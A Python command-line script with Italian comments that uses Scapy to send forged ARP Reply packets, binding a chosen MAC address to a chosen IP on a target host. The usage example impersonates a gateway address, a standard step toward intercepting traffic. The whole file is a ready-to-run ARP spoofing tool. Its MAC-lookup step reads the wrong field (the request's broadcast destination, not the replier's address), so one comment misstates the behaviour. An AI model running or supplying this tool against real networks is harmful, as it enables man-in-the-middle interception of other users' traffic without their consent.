#!/usr/bin/env python3

import sys
from scapy.all import *
import time

def invia_arp_reply_falsificata(iface, target_ip, spoof_mac, spoof_ip, count):
    """
    Costruisce e invia pacchetti ARP Reply (op=2) falsificati.

    Args:
        iface (str): Interfaccia di rete da cui inviare.
        target_ip (str): IP del destinatario che deve ricevere la ARP Reply.
        spoof_mac (str): MAC address che si vuole associare a SPOOF_IP (hwsrc).
        spoof_ip (str): IP address che si vuole annunciare (psrc).
        count (int): Numero di pacchetti da inviare.
    """
    print(f"--- Configurazione ---")
    print(f"Interfaccia: {iface}")
    print(f"IP Falsificato (psrc): {spoof_ip}")
    print(f"MAC Falsificato (hwsrc): {spoof_mac}")
    print(f"IP Destinatario (pdst): {target_ip}")
    print(f"Pacchetti da inviare: {count}")
    print("----------------------")

    # 1. Trova il MAC del destinatario
    # Scapy invierà prima una ARP Request per risolvere il MAC del TARGET_IP.
    # Se la sua cache è vuota, questo è necessario per impostare l'intestazione Ethernet.
    try:
        # Arping per risolvere il MAC. timeout=1 per non aspettare troppo.
        ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=target_ip),
                         timeout=1, iface=iface, verbose=False)
        target_mac = ans[0][0].dst # Prende il MAC di destinazione dal pacchetto di risposta (ans)
    except IndexError:
        print("\n[ERRORE] Impossibile risolvere il MAC del destinatario. Assicurati che l'host sia online.")
        # Se non riesce a trovare il MAC, invia a MAC broadcast (FF:FF:FF:FF:FF:FF)
        target_mac = "FF:FF:FF:FF:FF:FF" 
        print(f"[ATTENZIONE] Invio in modalita' broadcast (MAC Dest: {target_mac})")
    except Exception as e:
        print(f"\n[ERRORE GRAVE] Errore durante la risoluzione ARP: {e}")
        return

    # 2. Costruzione del Pacchetto
    
    # Livello Ethernet (Layer 2):
    # dst: MAC del destinatario (se trovato, altrimenti broadcast)
    # src: Il MAC fittizio (spoof_mac) che apparira' come sorgente Layer 2
    eth_layer = Ether(dst=target_mac, src=spoof_mac)

    # Livello ARP:
    # op=2: ARP Reply
    # psrc: IP Sorgente (IP falsificato)
    # hwsrc: MAC Sorgente (MAC falsificato)
    # pdst: IP Destinazione (Target)
    arp_layer = ARP(op=2, 
                    psrc=spoof_ip, 
                    hwsrc=spoof_mac, 
                    pdst=target_ip)

    packet = eth_layer / arp_layer

    # 3. Invio
    print(f"\nInvio {count} pacchetti ARP Reply...")
    
    # sendp è usata per l'invio a livello 2 (Ethernet)
    sendp(packet, iface=iface, count=count, inter=0.1, verbose=False) 
    
    print("Invio completato.")


if __name__ == "__main__":
    if len(sys.argv) != 6:
        print(f"Uso: sudo python3 {sys.argv[0]} <interfaccia> <ip_destinatario> <mac_spoof> <ip_spoof> <count>")
        print("\nEsempio:")
        print(f"sudo python3 {sys.argv[0]} enp0s8 192.168.10.192 AA:BB:CC:DD:EE:FF 192.168.10.1 10")
        sys.exit(1)

    # I parametri sono: [1] interfaccia, [2] target_ip, [3] spoof_mac, [4] spoof_ip, [5] count
    interface = sys.argv[1]
    target_ip_addr = sys.argv[2]
    spoof_mac_addr = sys.argv[3]
    spoof_ip_addr = sys.argv[4]
    
    try:
        packet_count = int(sys.argv[5])
    except ValueError:
        print("[ERRORE] Il numero di pacchetti deve essere un intero valido.")
        sys.exit(1)

    # Chiama la funzione di invio
    invia_arp_reply_falsificata(interface, target_ip_addr, spoof_mac_addr, spoof_ip_addr, packet_count)